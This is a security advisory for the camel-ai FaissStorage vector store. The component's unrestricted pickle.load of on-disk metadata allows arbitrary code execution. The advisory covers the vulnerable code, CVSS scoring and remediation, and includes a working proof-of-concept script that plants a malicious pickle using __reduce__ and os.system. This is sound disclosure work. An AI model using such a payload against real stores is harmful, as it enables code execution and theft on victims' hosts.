# CAMEL FaissStorage unrestricted pickle deserialization of vector-store metadata allows arbitrary code execution (CWE-502, CVSS 9.3)

## Summary

An attacker who can place or overwrite a file in the storage directory of a CAMEL `FaissStorage` instance executes arbitrary code on the host with the privileges of the process that loads the vector store. In camel-ai 0.2.61 through 0.2.91a5, `FaissStorage` persists its metadata with `pickle` and reads it back with unrestricted `pickle.load` -- no class whitelist and no integrity check -- and instantiating the storage with a `storage_path` automatically triggers the deserialization. The payload can return well-formed metadata, so the store loads without any error.

## Details

`FaissStorage` (`camel/storages/vectordb_storages/faiss.py`) is the framework's FAISS-backed vector store and a documented backend of the framework's own RAG cookbook (`docs/cookbooks/mcp/agent_to_mcp_with_faiss.ipynb` builds a RAG agent on `FaissStorage` with `storage_path` set to a working-directory folder). It persists the FAISS index and a metadata dictionary (ID mappings, payloads, vectors) into `<collection>.index` and `<collection>.metadata`; the record-mutating calls re-persist them -- `add()` (faiss.py:351), `update_payload()` (:379), and both `delete()` branches (:509, :561) call `_save_to_disk()`, while `clear()` and `delete_collection()` delete the files outright.

```python
# camel/storages/vectordb_storages/faiss.py:222-223 -- metadata persisted with pickle
        with open(self._get_metadata_path(), 'wb') as f:
            pickle.dump(metadata, f)

# camel/storages/vectordb_storages/faiss.py:124-126 -- instantiating the storage
# with a storage_path automatically loads and deserializes whatever is on disk
        # Load existing index if it exists
        if self.storage_path:
            self._load_from_disk()

# camel/storages/vectordb_storages/faiss.py:243-244 -- unrestricted deserialization
                with open(metadata_path, 'rb') as f:
                    metadata = pickle.load(f)
```

The deserialization applies no restriction of any kind: `_load_from_disk()` calls the module-level `pickle.load` directly (:243-244) -- there is no `Unpickler` subclass limiting `find_class` to safe types, and there is no HMAC or signature verifying the file was not altered. A pickle stream can reference arbitrary callables (such as `os.system`), and the unpickler invokes them during loading; the standard-library documentation for `pickle` itself warns never to unpickle data from an untrusted source or data that could have been tampered with.

The method does validate the loaded structure -- it checks five required keys (:247-259) -- but that check runs only after `pickle.load` has already executed any code embedded in the stream, and a payload can return a metadata dict carrying exactly those keys, so the store finishes loading with no error and no traceback.

The vulnerable code is present in every release that ships the component and remains unfixed: the file is byte-identical (git blob `20f1c1604b6c8c6c8e5abc5131df541c89bd14fc`) in v0.2.91a5 and in the current master branch, and the latest stable PyPI release 0.2.90 contains the same unrestricted `pickle.load` at the same lines (:223, :244) -- that file differs from v0.2.91a5 only in the `delete()` method's ID-removal handling.

**Why this is a vulnerability:**

- *"The storage directory is the operator's responsibility, so a hostile metadata file is out of scope."* Loading data files supplied by the environment is the normal operation of a persistent vector store -- the framework's own cookbook points `storage_path` at a working-directory folder fed by the application. The component treats the file as untrusted input everywhere except where it matters: it validates the loaded structure and anticipates malformed content (:247-259), but only after `pickle.load` has already executed any embedded code. Deserialization of attacker-writable data files is tracked upstream as a vulnerability in comparable Python libraries: CVE-2025-64512 (pdfminer.six executes arbitrary code from a malicious pickle file inside a PDF; the GitHub security advisory that filed it scores 8.6 with `AV:L/AC:L/PR:N/UI:R/S:C` -- the same Local vector and Changed scope used here, with NVD's own analysis giving 7.8 at Scope:Unchanged, the alternate recorded for this vulnerability under Impact) and CVE-2025-56005 (PLY deserializes an attacker-supplied `picklefile` in `yacc()`, remote code execution).
- *"Applications that never load untrusted stores are not affected, so this is a configuration issue."* That limitation is stated plainly in the Impact section -- but the component offers no way to authenticate a store before deserialization: the auto-load sits inside `__init__` (:124-126), so the payload executes inside the constructor, before any application code can inspect or validate the files. Mitigating at the application layer means replacing the component, not configuring it.
- *"pickle is a legitimate choice for internal persistence."* The persisted metadata needs only plain dicts, strings, numbers, numpy arrays, and the `VectorDistance` enum value for the distance metric (the `"distance"` key, faiss.py:219) -- none of which requires executing attacker-chosen code. Unpickling a legitimate store does resolve a small, fixed set of globals -- numpy's array-reconstruction globals (`numpy._core.multiarray._reconstruct`, `numpy.ndarray`, `numpy.dtype`; `numpy.core.multiarray._reconstruct` under numpy 1.x) and `camel.types.enums.VectorDistance` -- but the unpickler resolves whatever the stream names, including `os.system`. A JSON + `.npy` representation (serializing the enum's string value, e.g. `"cosine"`) would be lossless for everything the component itself writes, which is why the missing restriction is a defect rather than a design trade-off.

**Suggested remediation:**

1. Persist metadata in a non-executable format: JSON for the mappings and payloads, `numpy` `.npy` for the vectors; drop pickle entirely.
2. If binary compatibility must be kept, subclass `pickle.Unpickler` with a `find_class` allowlist (built-in containers plus numpy's array-reconstruction globals -- `numpy._core.multiarray._reconstruct` / `numpy.core.multiarray._reconstruct`, `numpy.ndarray`, `numpy.dtype` -- and `camel.types.enums.VectorDistance`; refuse `os`, `posix`, `subprocess`, and all other globals) and verify an HMAC of the file before loading.
3. Load lazily via an explicit method instead of inside `__init__`, so applications can validate or migrate a store before deserialization runs.

## Proof of Concept

Dynamically verified against camel-ai 0.2.91a5 in August 2026 (full validation chain -- legitimate store creation, pre-attack baseline, metadata overwrite, reload-triggered execution, marker assertion, cleanup -- passes 11/11 automated assertions; the script below is the same trigger chain in condensed form). No LLM, no server, and no network are involved at any point: this is a pure library-level trigger.

**Setup:** `pip install "camel-ai==0.2.91a5" faiss-cpu`. `faiss-cpu` is not a base dependency of camel-ai (the storage backends are optional extras), and `FaissStorage` requires it at runtime (`@dependencies_required('faiss')`, faiss.py:73).

```python
# poc.py -- library-level trigger; no LLM, no server, no network at any point
import os, pickle, shutil, tempfile

from camel.storages.vectordb_storages import FaissStorage, VectorRecord

tmp = tempfile.gettempdir()
storage = os.path.join(tmp, "camel_faiss_poc")
marker = os.path.join(tmp, "camel_faiss_poc_marker.txt")
shutil.rmtree(storage, ignore_errors=True)
if os.path.exists(marker):
    os.remove(marker)

# 1) legitimate usage: create a store and add one record; FaissStorage
#    persists <collection>.index and <collection>.metadata into storage/
store = FaissStorage(vector_dim=2, storage_path=storage,
                     collection_name="vector_store")
store.add([VectorRecord(id="doc1", vector=[0.1, 0.2],
                        payload={"text": "hello"})])
metadata_path = os.path.join(storage, "vector_store.metadata")
print("marker exists before attack:", os.path.exists(marker))  # -> False

# 2) attacker overwrites the metadata file with a malicious pickle
#    (__reduce__ -> os.system); the returned dict carries the five keys
#    _load_from_disk() validates afterwards, so loading stays error-free
def run_cmd(cmd, result):
    os.system(cmd)
    return result

class MaliciousMetadata:
    def __reduce__(self):
        write = "echo POC_EXECUTED > " + marker.replace("\\", "/")
        return (run_cmd, (write, {"id_to_index": {}, "index_to_id": {},
                                  "payloads": {}, "vectors": {},
                                  "vector_dim": 2}))

with open(metadata_path, "wb") as f:
    f.write(pickle.dumps(MaliciousMetadata()))

# 3) victim reloads the store: __init__ -> _load_from_disk() -> pickle.load
#    executes the embedded os.system call during deserialization
FaissStorage(vector_dim=2, storage_path=storage,
             collection_name="vector_store")

print("marker content:", open(marker).read().strip())          # -> POC_EXECUTED
shutil.rmtree(storage, ignore_errors=True)
os.remove(marker)
```

Running `python poc.py` prints `marker exists before attack: False` and then `marker content: POC_EXECUTED` -- the `echo` command executed inside `os.system` while `pickle.load` was deserializing the attacker-supplied file, with no LLM, no server, and no interaction of any kind. (If the OS temp path contains spaces -- e.g. a Windows user name with a space -- `cmd.exe` truncates an unquoted redirect target at the first space; point `TMP`/`TEMP` at a space-free directory first.)

## Impact

- **Type:** Deserialization of Untrusted Data (CWE-502). The persisted metadata file carries no integrity verification (CWE-347), so tampering cannot be detected.
- **Who is impacted:** any application that instantiates `FaissStorage` with a `storage_path` whose directory contents another party can influence -- document/file import features, shared or mounted storage, third-party or synchronized datasets, multi-tenant or hosted deployments. Applications whose store directories are never writable by anyone but the operator are not exposed.
- **Attacker capabilities:** arbitrary code execution with the privileges of the process loading the store: read arbitrary files and secrets (API keys, environment variables), modify or destroy files, and install persistence -- the payload re-executes on every subsequent load of the store. The payload can return well-formed metadata, so loading completes without errors and without any warning or error in the logs.
- **CVSS:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 9.3 (Critical).
  - AV:L -- exploitation requires writing a file into the vector-store directory (a local file-write primitive); the component has no network listener of its own.
  - AC:L -- a single fixed file overwrite; no race condition; verified repeatedly.
  - PR:N -- the attacker needs no privileges on the vulnerable component (only the file-write precondition above); the load runs with the privileges of the victim process.
  - UI:N -- the next plain instantiation of the store triggers the deserialization; no human action is required (the comparable pdfminer.six advisory CVE-2025-64512 was scored `UI:R` because a victim must open the malicious PDF; here even that step does not exist).
  - S:C -- `os.system` executes in the host OS context, outside the camel-ai package (the vulnerable component).
  - C:H / I:H / A:H -- arbitrary host read, write/execute, and process control.

**Scope note (alternate scoring).** If the scope is instead treated as Unchanged, the same vector with S:U scores **8.4** (High); if the delivery route (file import / third-party datasets) is argued to make the attack vector Network, `AV:N` with S:C scores **10.0** (Critical). All values were computed with the official FIRST CVSS v3.1 formula: ISS = 1-(1-0.56)^3 = 0.914816; Impact(S:C) = 7.52x(0.914816-0.029) - 3.25x(0.914816-0.02)^15 = 6.047730; Impact(S:U) = 6.42x0.914816 = 5.873119; Exploitability(AV:L) = 8.22x0.55x0.77x0.85x0.85 = 2.515145; Exploitability(AV:N) = 8.22x0.85x0.77x0.85x0.85 = 3.887043; Base(S:C, AV:L) = round-up(min(1.08x(6.047730+2.515145), 10)) = 9.3; Base(S:U, AV:L) = round-up(5.873119+2.515145) = 8.4; Base(S:C, AV:N) = round-up(min(1.08x(6.047730+3.887043), 10)) = 10.0.

## Affected products

| Field | Value |
|------|------|
| **Ecosystem** | `pip` |
| **Package name** | `camel-ai` |
| **Affected versions** | `>= 0.2.61, <= 0.2.91a5` |
| **Patched versions** | `None` |

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Score** | `9.3` |

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-502 | Deserialization of Untrusted Data | `_load_from_disk()` calls `pickle.load` directly on the on-disk `.metadata` file (faiss.py:243-244) with no `find_class` allowlist restriction; a malicious pickle executes arbitrary functions during loading (source-verified) |
| 2 | CWE-347 | Improper Verification of Cryptographic Signature | `_save_to_disk()` persists with `pickle.dump` (faiss.py:222-223) with no HMAC or signature, and `_load_from_disk()` performs no verification before loading, so tampering or replacement cannot be detected (source-verified; CWE-347 is a Base-layer ALLOWED entry in the CWE 4.20 dictionary -- the original candidate CWE-345 is a Class-layer DISCOURAGED entry not used for vulnerability mapping, and CWE-347 is its precise child) |
